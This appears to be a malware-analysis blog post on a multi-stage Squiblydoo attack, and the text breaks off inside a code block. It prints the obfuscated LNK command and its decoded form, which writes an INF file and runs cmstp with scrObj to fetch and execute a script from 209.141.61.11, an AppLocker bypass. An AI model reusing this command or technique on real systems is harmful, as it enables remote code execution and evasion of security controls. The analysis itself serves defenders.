<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' disqus.com disquscdn.com *.disqus.com *.disquscdn.com; form-action 'self' https://syndication.twitter.com/ https://platform.twitter.com disqus.com disquscdn.com *.disqus.com *.disquscdn.com; frame-src 'self' https://cse.google.com https://player.vimeo.com www.youtube.com www.youtube-nocookie.com https://platform.twitter.com https://syndication.twitter.com  jsfiddle.net www.instagram.com https://kuula.co https://www.slideshare.net https://www.google.com disqus.com disquscdn.com *.disqus.com *.disquscdn.com; img-src 'self' https://jeremylikness.visualstudio.com *.gstatic.com *.amazon-adsystem.com https://www.googleapis.com https://images-na.ssl-images-amazon.com https://platform.twitter.com *.twimg.com https://syndication.twitter.com data: https://files.kuula.io disqus.com disquscdn.com *.disqus.com *.disquscdn.com; object-src 'none'; style-src 'self' 'unsafe-inline' https://use.fontawesome.com https://fonts.googleapis.com https://www.google.com https://platform.twitter.com *.twimg.com disqus.com disquscdn.com *.disqus.com *.disquscdn.com; script-src 'self' 'unsafe-inline' https://platform.twitter.com https://static.cloudflareinsights.com disqus.com disquscdn.com *.disqus.com *.disquscdn.com; prefetch-src 'self' 'unsafe-inline' https://platform.twitter.com https://static.cloudflareinsights.com disqus.com disquscdn.com *.disqus.com *.disquscdn.com; connect-src 'self' 'unsafe-inline' https://platform.twitter.com https://static.cloudflareinsights.com disqus.com disquscdn.com *.disqus.com *.disquscdn.com;">
<meta name=keywords content="[Infosec Blue Team Linux]">
<meta name=robots content="noodp">
<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
<title>Analysis of a Multi-stage Squiblydoo variant - n0p Blog</title><meta name=Description content="n0p Blog"><meta property="og:title" content="Analysis of a Multi-stage Squiblydoo variant">
<meta property="og:description" content="Analysis of a Multi-stage Squiblydoo variant The first foothold of the Malware was delivered via IP Address (IOC) 209.141.61.11. When the user navigates to that server, depending on the User-Agent string of the request, you&rsquo;ll either get a signed, legitimate, non-malicious PDF document (Artifact #1 ZIP, 1d2d5b2befe5fcfea8e9303d87b92adaaf9f161a82e0e1341008518d1585e81a, VT 0/60) or a page with a simple CAPTCHA (Artifact #2 PCAP, dfed73960bd9aa030cc5d84df18eaf2d295dfa7f990614c53673e74b84034ef5, VT N/A) that ultimately leads to a ZIP file (Artifact #3 PCAP, 38dcef9b23f21a98fe9dde3f5b5eb643292bf41556b7e4d5da30484848c4cf3d, VT N/A and Artifact #4 ZIP, db647308649e2d3815f7d53d024ac50e8dead8a3caf33bc203dac90b5dbb1596, VT 15/61).">
<meta property="og:type" content="article">
<meta property="og:url" content="https://blog.n0p.me/2020/10/2020-10-13-malware-applocker-bypass/"><meta property="og:image" content="https://blog.n0p.me/author.jpg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2020-10-13T00:00:00+00:00">
<meta property="article:modified_time" content="2020-10-13T00:00:00+00:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://blog.n0p.me/author.jpg">
<meta name=twitter:title content="Analysis of a Multi-stage Squiblydoo variant">
<meta name=twitter:description content="Analysis of a Multi-stage Squiblydoo variant The first foothold of the Malware was delivered via IP Address (IOC) 209.141.61.11. When the user navigates to that server, depending on the User-Agent string of the request, you&rsquo;ll either get a signed, legitimate, non-malicious PDF document (Artifact #1 ZIP, 1d2d5b2befe5fcfea8e9303d87b92adaaf9f161a82e0e1341008518d1585e81a, VT 0/60) or a page with a simple CAPTCHA (Artifact #2 PCAP, dfed73960bd9aa030cc5d84df18eaf2d295dfa7f990614c53673e74b84034ef5, VT N/A) that ultimately leads to a ZIP file (Artifact #3 PCAP, 38dcef9b23f21a98fe9dde3f5b5eb643292bf41556b7e4d5da30484848c4cf3d, VT N/A and Artifact #4 ZIP, db647308649e2d3815f7d53d024ac50e8dead8a3caf33bc203dac90b5dbb1596, VT 15/61).">
<meta name=application-name content="n0p Blog">
<meta name=apple-mobile-web-app-title content="n0p Blog"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico>
<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.n0p.me/2020/10/2020-10-13-malware-applocker-bypass/><link rel=prev href=https://blog.n0p.me/2020/09/2020-09-28-sshmfahook/><link rel=next href=https://blog.n0p.me/2020/12/2021-12-28-sunburst-defend/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Analysis of a Multi-stage Squiblydoo variant","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.n0p.me\/2020\/10\/2020-10-13-malware-applocker-bypass\/"},"genre":"posts","keywords":"malware, windows, applocker, forensics, LOL_binaries, mitre","wordcount":3051,"url":"https:\/\/blog.n0p.me\/2020\/10\/2020-10-13-malware-applocker-bypass\/","datePublished":"2020-10-13T00:00:00+00:00","dateModified":"2020-10-13T00:00:00+00:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"Ali Mosajjal"},"author":{"@type":"Person","name":"Ali Mosajjal"},"description":""}</script></head>
<body header-desktop header-mobile><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark')&&document.body.setAttribute('theme','dark')</script>
<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title="n0p Blog">n0p Blog</a>
</div>
<div class=menu>
<div class=menu-inner><a class=menu-item href=/posts> Posts </a><a class=menu-item href=/tags> Tags </a><a class=menu-item href=/categories> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search>
<i class="fas fa-search fa-fw"></i>
</a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear>
<i class="fas fa-times-circle fa-fw"></i>
</a>
<span class="search-button search-loading" id=search-loading-desktop>
<i class="fas fa-spinner fa-fw fa-spin"></i>
</span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i>
</a>
</div>
</div>
</div>
</header><header class=mobile id=header-mobile>
<div class=header-container>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title="n0p Blog">n0p Blog</a>
</div>
<div class=menu-toggle id=menu-toggle-mobile>
<span></span><span></span><span></span>
</div>
</div>
<div class=menu id=menu-mobile><div class=search-wrapper>
<div class="search mobile" id=search-mobile>
<input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search>
<i class="fas fa-search fa-fw"></i>
</a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear>
<i class="fas fa-times-circle fa-fw"></i>
</a>
<span class="search-button search-loading" id=search-loading-mobile>
<i class="fas fa-spinner fa-fw fa-spin"></i>
</span>
</div>
<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
Cancel
</a>
</div><a class=menu-item href=/posts title>Posts</a><a class=menu-item href=/tags title>Tags</a><a class=menu-item href=/categories title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i>
</a></div>
</div>
</header>
<div class="search-dropdown desktop">
<div id=search-dropdown-desktop></div>
</div>
<div class="search-dropdown mobile">
<div id=search-dropdown-mobile></div>
</div>
<main class=main>
<div class=container><div class=toc id=toc-auto>
<h2 class=toc-title>Contents</h2>
<div class=toc-content id=toc-content-auto></div>
</div><article class="page single"><h1 class="single-title animated flipInX">Analysis of a Multi-stage Squiblydoo variant</h1><div class=post-meta>
<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=" author" class=author><i class="fas fa-user-circle fa-fw"></i>Ali Mosajjal</a></span>&nbsp;<span class=post-category>included in <a href=/categories/windows/><i class="far fa-folder fa-fw"></i>Windows</a>&nbsp;<a href=/categories/malware/><i class="far fa-folder fa-fw"></i>Malware</a>&nbsp;<a href=/categories/security/><i class="far fa-folder fa-fw"></i>security</a></span></div>
<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-10-13>2020-10-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3051 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;15 minutes&nbsp;</div>
</div><div class="details toc" id=toc-static kept>
<div class="details-summary toc-title">
<span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span>
</div>
<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
<ul>
<li><a href=#stage-2-updatetxt>Stage 2, update.txt</a></li>
<li><a href=#stage-3-another-js>Stage 3, another JS</a></li>
<li><a href=#stage-5-brand-new-xml-and-a-c2>Stage 5, brand new XML and a C2!</a>
<ul>
<li><a href=#c2-start-beaconing>C2 start Beaconing</a></li>
</ul>
</li>
<li><a href=#artifact-summary>Artifact Summary</a>
<ul>
<li><a href=#artifact1pdf>artifact1.pdf</a></li>
<li><a href=#artifact2pcap>artifact2.pcap</a></li>
<li><a href=#artifact3pcap>artifact3.pcap</a></li>
<li><a href=#artifact4zip>artifact4.zip</a></li>
<li><a href=#artifact5lnk>artifact5.lnk</a></li>
<li><a href=#artifact6txt>artifact6.txt</a></li>
<li><a href=#artifact7pcap>artifact7.pcap</a></li>
<li><a href=#artifact8js>artifact8.js</a></li>
<li><a href=#artifact9js>artifact9.js</a></li>
<li><a href=#artifact10ocx>artifact10.ocx</a></li>
<li><a href=#artifact11doc>artifact11.doc</a></li>
<li><a href=#artifact12pbk>artifact12.pbk</a></li>
<li><a href=#artifact13exe>artifact13.exe</a></li>
<li><a href=#artifact14txt>artifact14.txt</a></li>
<li><a href=#artifact15txt>artifact15.txt</a></li>
<li><a href=#artifact16pcap>artifact16.pcap</a></li>
<li><a href=#artifact17mpllz4>artifact17.MPL.lz4</a></li>
<li><a href=#artifact18saz>artifact18.saz</a></li>
</ul>
</li>
<li><a href=#next-steps>Next steps</a></li>
</ul>
</nav></div>
</div><div class=content id=content><h1 id=analysis-of-a-multi-stage-squiblydoo-variant>Analysis of a Multi-stage Squiblydoo variant</h1>
<p>The first foothold of the Malware was delivered via IP Address (IOC) <code>209.141.61.11</code>. When the user navigates to that server, depending on the User-Agent string of the request, you&rsquo;ll either get a signed, legitimate, non-malicious PDF document (Artifact #1 ZIP, <code>1d2d5b2befe5fcfea8e9303d87b92adaaf9f161a82e0e1341008518d1585e81a</code>, VT 0/60) or a page with a simple CAPTCHA (Artifact #2 PCAP, <code>dfed73960bd9aa030cc5d84df18eaf2d295dfa7f990614c53673e74b84034ef5</code>, VT N/A) that ultimately leads to a ZIP file (Artifact #3 PCAP, <code>38dcef9b23f21a98fe9dde3f5b5eb643292bf41556b7e4d5da30484848c4cf3d</code>, VT N/A and Artifact #4 ZIP, <code>db647308649e2d3815f7d53d024ac50e8dead8a3caf33bc203dac90b5dbb1596</code>, VT 15/61).</p>
<p>The ZIP file contains a single <code>.lnk</code> file (Artifact #5 LNK, <code>c32bb3eb1634d6765e41fcb7071d1ca2b70bb50dc3cb7c9da84a00427b3dd642</code>, VT 15/56)</p>
<p>Since <code>lnk</code> files are not easy to manually parse, I used <a href=https://raw.githubusercontent.com/HarmJ0y/pylnker/master/pylnker.py target=_blank rel="noopener noreffer">pylnker</a>:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-batch data-lang=batch>out:  Lnk File: artifacts/artifact5.lnk
Link Flags: HAS SHELLIDLIST <span class=p>|</span> POINTS TO FILE/DIR <span class=p>|</span> NO DESCRIPTION <span class=p>|</span> NO RELATIVE PATH STRING <span class=p>|</span> NO WORKING DIRECTORY <span class=p>|</span> HAS CMD LINE ARGS <span class=p>|</span> HAS CUSTOM ICON
File Attributes: ARCHIVE
Create Time:   1601-01-01 11:39:04
Access Time:   1601-01-01 11:39:04
Modified Time: 1601-01-01 11:39:04
Target length: 236032
Icon Index: 2
ShowWnd: SW_NORMAL
HotKey: 0
Target is on local volume
Volume Type: Fixed (Hard Disk)
Volume Serial: 00000000
<span class=k>Vol</span> Label: 
Base Path: 
<span class=p>(</span>App Path:<span class=p>)</span> Remaining Path: 
Command Line: /v /c set <span class=s2>&#34;UoglocMF5002=items&#34;</span> <span class=p>&amp;&amp;</span> <span class=k>call</span> <span class=k>set</span> <span class=s2>&#34;UoglocMF94812=</span><span class=nv>%UoglocMF5002:~4,1%</span><span class=s2>&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF5127=a&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF6603=t&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF06364=d&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF9305=c&#34;</span> <span class=p>&amp;&amp;</span> <span class=k>call</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF21627=</span><span class=nv>%ran!UoglocMF06364!om%</span><span class=s2>.inf&#34;</span> <span class=p>&amp;&amp;</span> <span class=k>call</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF6838=</span><span class=nv>%app!UoglocMF06364!ata%</span><span class=s2>\Micro!UoglocMF94812!oft\!UoglocMF21627!&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF14637=.&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF15608=&#34;</span><span class=se>^&#34;</span> <span class=p>&amp;&amp;</span> <span class=p>(</span><span class=k>for</span> <span class=nv>%l in (&#34;[ver!UoglocMF94812!ion]&#34; &#34;!UoglocMF94812!ign!UoglocMF5127!ture=$Window!UoglocMF94812! NT$&#34; &#34;[!UoglocMF06364!e!UoglocMF94812!tinationdirs]&#34; &#34;2D0D=01&#34; &#34;[!UoglocMF06364!efaultin!UoglocMF94812!tall_singleu!UoglocMF94812!er]&#34; &#34;UnRegis!UoglocMF6603!erOCXs=F251A5&#34; &#34;!UoglocMF06364!elfiles=2D0D&#34; &#34;[F251A5]&#34; &#34;%</span>11<span class=nv>%\%</span>UoglocMF7741<span class=nv>%crO%</span>UoglocMF37180<span class=nv>%j,NI,%</span>UoglocMF2085<span class=se>%%</span>UoglocMF5568<span class=se>%%</span>UoglocMF5568<span class=nv>%p%</span>UoglocMF54670<span class=se>%%</span>UoglocMF92584<span class=se>%%</span>UoglocMF92584<span class=nv>%2</span>09<span class=nv>!UoglocMF14637!%UoglocMF0342%</span>141<span class=nv>!UoglocMF14637!%UoglocMF0342%</span>61<span class=nv>!UoglocMF14637!%UoglocMF0342%</span>11/update!UoglocMF14637<span class=nv>!%UoglocMF0342%txt&#34; &#34;[2D0D]&#34; &#34;!</span>UoglocMF21627<span class=nv>!&#34; &#34;[!</span>UoglocMF94812!!UoglocMF6603<span class=nv>!rings]&#34; &#34;UoglocMF5568=t&#34; &#34;UoglocMF2085=h&#34; &#34;UoglocMF54670=:&#34; &#34;UoglocMF7741=s&#34; &#34;UoglocMF92584=/&#34; &#34;UoglocMF37180=b&#34; &#34;UoglocMF0342=&#34; &#34;!</span>UoglocMF94812<span class=nv>!ervicen!</span>UoglocMF5127<span class=nv>!me=&#39; &#39;&#34; &#34;!</span>UoglocMF94812<span class=nv>!hortsvcn!</span>UoglocMF5127<span class=nv>!me=&#39; &#39;&#34;) do @e!</span>UoglocMF9305<span class=nv>!ho %~l)&gt;&#34;!</span>UoglocMF6838<span class=nv>!&#34;&amp;&amp; !</span>UoglocMF94812<span class=nv>!t!</span>UoglocMF5127<span class=nv>!rt &#34;&#34; /MIN wmi!</span>UoglocMF9305<span class=nv>! proce!</span>UoglocMF94812<span class=nv>!s call !</span>UoglocMF9305<span class=nv>!rea!</span>UoglocMF6603<span class=nv>!e &#34;cm!</span>UoglocMF94812!!UoglocMF6603<span class=nv>!p /ns /!</span>UoglocMF94812<span class=nv>! /su !</span>UoglocMF6838!<span class=s2>&#34;</span>
Icon filename: ieframe.dll
</code></pre></td></tr></table>
</div>
</div><p>the <code>.lnk</code> file has a <code>cmd</code> command but it looks encoded/obfuscated. Let&rsquo;s work out a way to extract the command.</p>
<p>Using <a href=https://raw.githubusercontent.com/DissectMalware/batch_deobfuscator/master/batch_interpreter.py target=_blank rel="noopener noreffer">Batch Interpreter</a>, we can see the command that the attacker is trying to execute:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-batch data-lang=batch><span class=p>(</span>.env<span class=p>)</span> ali@ali-pc <span class=p>&gt;</span> python batch_interpreter.py
Please enter an obfuscated batch command:
/v /c set <span class=s2>&#34;UoglocMF5002=items&#34;</span> <span class=p>&amp;&amp;</span> <span class=k>call</span> <span class=k>set</span> <span class=s2>&#34;UoglocMF94812=</span><span class=nv>%UoglocMF5002:~4,1%</span><span class=s2>&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF5127=a&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF6603=t&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF06364=d&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF9305=c&#34;</span> <span class=p>&amp;&amp;</span> <span class=k>call</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF21627=</span><span class=nv>%ran!UoglocMF06364!om%</span><span class=s2>.inf&#34;</span> <span class=p>&amp;&amp;</span> <span class=k>call</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF6838=</span><span class=nv>%app!UoglocMF06364!ata%</span><span class=s2>\Micro!UoglocMF94812!oft\!UoglocMF21627!&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF14637=.&#34;</span> <span class=p>&amp;&amp;</span> <span class=nv>!UoglocMF94812!</span>et <span class=s2>&#34;UoglocMF15608=&#34;</span><span class=se>^&#34;</span> <span class=p>&amp;&amp;</span> <span class=p>(</span><span class=k>for</span> <span class=nv>%l in (&#34;[ver!UoglocMF94812!ion]&#34; &#34;!UoglocMF94812!ign!UoglocMF5127!ture=$Window!UoglocMF94812! NT$&#34; &#34;[!UoglocMF06364!e!UoglocMF94812!tinationdirs]&#34; &#34;2D0D=01&#34; &#34;[!UoglocMF06364!efaultin!UoglocMF94812!tall_singleu!UoglocMF94812!er]&#34; &#34;UnRegis!UoglocMF6603!erOCXs=F251A5&#34; &#34;!UoglocMF06364!elfiles=2D0D&#34; &#34;[F251A5]&#34; &#34;%</span>11<span class=nv>%\%</span>UoglocMF7741<span class=nv>%crO%</span>UoglocMF37180<span class=nv>%j,NI,%</span>UoglocMF2085<span class=se>%%</span>UoglocMF5568<span class=se>%%</span>UoglocMF5568<span class=nv>%p%</span>UoglocMF54670<span class=se>%%</span>UoglocMF92584<span class=se>%%</span>UoglocMF92584<span class=nv>%2</span>09<span class=nv>!UoglocMF14637!%UoglocMF0342%</span>141<span class=nv>!UoglocMF14637!%UoglocMF0342%</span>61<span class=nv>!UoglocMF14637!%UoglocMF0342%</span>11/update!UoglocMF14637<span class=nv>!%UoglocMF0342%txt&#34; &#34;[2D0D]&#34; &#34;!</span>UoglocMF21627<span class=nv>!&#34; &#34;[!</span>UoglocMF94812!!UoglocMF6603<span class=nv>!rings]&#34; &#34;UoglocMF5568=t&#34; &#34;UoglocMF2085=h&#34; &#34;UoglocMF54670=:&#34; &#34;UoglocMF7741=s&#34; &#34;UoglocMF92584=/&#34; &#34;UoglocMF37180=b&#34; &#34;UoglocMF0342=&#34; &#34;!</span>UoglocMF94812<span class=nv>!ervicen!</span>UoglocMF5127<span class=nv>!me=&#39; &#39;&#34; &#34;!</span>UoglocMF94812<span class=nv>!hortsvcn!</span>UoglocMF5127<span class=nv>!me=&#39; &#39;&#34;) do @e!</span>UoglocMF9305<span class=nv>!ho %~l)&gt;&#34;!</span>UoglocMF6838<span class=nv>!&#34;&amp;&amp; !</span>UoglocMF94812<span class=nv>!t!</span>UoglocMF5127<span class=nv>!rt &#34;&#34; /MIN wmi!</span>UoglocMF9305<span class=nv>! proce!</span>UoglocMF94812<span class=nv>!s call !</span>UoglocMF9305<span class=nv>!rea!</span>UoglocMF6603<span class=nv>!e &#34;cm!</span>UoglocMF94812!!UoglocMF6603<span class=nv>!p /ns /!</span>UoglocMF94812<span class=nv>! /su !</span>UoglocMF6838!<span class=s2>&#34;</span>

/v /c set <span class=s2>&#34;UoglocMF5002=items&#34;</span>
call set <span class=s2>&#34;UoglocMF94812=s&#34;</span>
set <span class=s2>&#34;UoglocMF5127=a&#34;</span>
set <span class=s2>&#34;UoglocMF6603=t&#34;</span>
set <span class=s2>&#34;UoglocMF06364=d&#34;</span>
set <span class=s2>&#34;UoglocMF9305=c&#34;</span>
call set <span class=s2>&#34;UoglocMF21627=.inf&#34;</span>
call set <span class=s2>&#34;UoglocMF6838=\Microsoft\.inf&#34;</span>
set <span class=s2>&#34;UoglocMF14637=.&#34;</span>
set <span class=s2>&#34;UoglocMF15608=&#34;&#34;</span>

(for 11UoglocMF7741<span class=nv>%cro%</span>UoglocMF37180<span class=nv>%j,ni,%</span>UoglocMF2085<span class=se>%%</span>UoglocMF5568<span class=se>%%</span>uoglocmf5568<span class=nv>%p%</span>uoglocmf54670<span class=se>%%</span>uoglocmf92584<span class=se>%%</span>uoglocmf92584<span class=nv>%2</span>09.<span class=nv>%uoglocmf0342%</span>141.<span class=nv>%uoglocmf0342%</span>61.<span class=nv>%uoglocmf0342%</span>11/update.<span class=nv>%uoglocmf0342%</span>txt<span class=s2>&#34; &#34;</span>[2D0D]<span class=s2>&#34; &#34;</span>.inf<span class=s2>&#34; &#34;</span>[strings]<span class=s2>&#34; &#34;</span>UoglocMF5568=t<span class=s2>&#34; &#34;</span>UoglocMF2085=h<span class=s2>&#34; &#34;</span>UoglocMF54670=:<span class=s2>&#34; &#34;</span>UoglocMF7741=s<span class=s2>&#34; &#34;</span>UoglocMF92584=/<span class=s2>&#34; &#34;</span>UoglocMF37180=b<span class=s2>&#34; &#34;</span>UoglocMF0342=<span class=s2>&#34; &#34;</span>servicename=&#39; &#39;<span class=s2>&#34; &#34;</span>shortsvcname=&#39; &#39;<span class=s2>&#34;) do @echo %~l)&gt;&#34;</span>\Microsoft\.inf<span class=s2>&#34;</span>

start <span class=s2>&#34;&#34;</span> /MIN wmic process call create <span class=s2>&#34;cmstp /ns /s /su \Microsoft\.inf&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>Looks like the automated string gave us some clues but didn&rsquo;t do the job very well especially in the &ldquo;for&rdquo; loop inside the batch script. After manually replacing some strings/variables, this <code>cmd</code> showed up:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-batch data-lang=batch>/v /c set <span class=s2>&#34;UoglocMF14637=.&#34;</span> <span class=p>&amp;&amp;</span> <span class=k>set</span> <span class=s2>&#34;UoglocMF15608=&#34;</span><span class=se>^&#34;</span> <span class=p>&amp;&amp;</span> <span class=p>(</span><span class=k>for</span> <span class=nv>%l in (&#34;[version]&#34; &#34;signature=$Windows NT$&#34; &#34;[destinationdirs]&#34; &#34;2D0D=01&#34; &#34;[defaultinstall_singleuser]&#34; &#34;UnRegisterOCXs=F251A5&#34; &#34;delfiles=2D0D&#34; &#34;[F251A5]&#34; &#34;%</span>11<span class=nv>%\scrObj,NI,http://209.141.61.11/update.txt&#34; &#34;[2D0D]&#34; &#34;RANDOM.inf&#34; &#34;[strings]&#34; &#34;UoglocMF5568=t&#34; &#34;UoglocMF2085=h&#34; &#34;UoglocMF54670=:&#34; &#34;UoglocMF7741=s&#34; &#34;UoglocMF92584=/&#34; &#34;UoglocMF37180=b&#34; &#34;UoglocMF0342=&#34; &#34;servicename=&#39; &#39;&#34; &#34;shortsvcname=&#39; &#39;&#34;) do @echo %</span>~l)<span class=p>&gt;</span><span class=s2>&#34;USER_APP_DATA\Microsoft\RANDOM.inf&#34;</span><span class=p>&amp;&amp;</span> start <span class=s2>&#34;&#34;</span> /MIN wmic process call create <span class=s2>&#34;cmstp /ns /s /su USER_APP_DATA\Microsoft\RANDOM.inf&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p><figure><a class=lightgallery href=/img/malware-applocker-bypass/2.jpg title="Process Tree of running cmd" data-thumbnail=/img/malware-applocker-bypass/2.jpg data-sub-html="<h2>Process Tree of running cmd</h2><p>Process Tree of running cmd</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/2.jpg data-srcset="/img/malware-applocker-bypass/2.jpg, /img/malware-applocker-bypass/2.jpg 1.5x, /img/malware-applocker-bypass/2.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/2.jpg>
</a><figcaption class=image-caption>Process Tree of running cmd</figcaption>
</figure></p>
<p>very interesting stuff already. We can see that the <code>cmd</code> contains two distinct sections. The first part creates a &ldquo;RANDOM.inf&rdquo; file (RANDOM is a random number generated via %random% command) and the second part starts it using WMI and <code>cmstp</code>. Let&rsquo;s dig deeper in the first part and see how Microsoft.inf gets generated.</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/3.jpg title="running cmstp" data-thumbnail=/img/malware-applocker-bypass/3.jpg data-sub-html="<h2>running cmstp</h2><p>running cmstp</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/3.jpg data-srcset="/img/malware-applocker-bypass/3.jpg, /img/malware-applocker-bypass/3.jpg 1.5x, /img/malware-applocker-bypass/3.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/3.jpg>
</a><figcaption class=image-caption>running cmstp</figcaption>
</figure></p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/4.jpg title="cmstp help" data-thumbnail=/img/malware-applocker-bypass/4.jpg data-sub-html="<h2>cmstp help</h2><p>cmstp help</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/4.jpg data-srcset="/img/malware-applocker-bypass/4.jpg, /img/malware-applocker-bypass/4.jpg 1.5x, /img/malware-applocker-bypass/4.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/4.jpg>
</a><figcaption class=image-caption>cmstp help</figcaption>
</figure></p>
<p>Sidenote: <code>cmstp</code> is often used to bypass Applocker, <a href=https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/ target=_blank rel="noopener noreffer">Reference</a>. MITRE ATT&CK (#T1218.003) links this technique to Cobalt Group and MuddyWater.</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/5.jpg title="applocker bypass blog" data-thumbnail=/img/malware-applocker-bypass/5.jpg data-sub-html="<h2>applocker bypass blog</h2><p>applocker bypass blog</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/5.jpg data-srcset="/img/malware-applocker-bypass/5.jpg, /img/malware-applocker-bypass/5.jpg 1.5x, /img/malware-applocker-bypass/5.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/5.jpg>
</a><figcaption class=image-caption>applocker bypass blog</figcaption>
</figure></p>
<p>Beautified version of the created <code>.ini</code> file:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
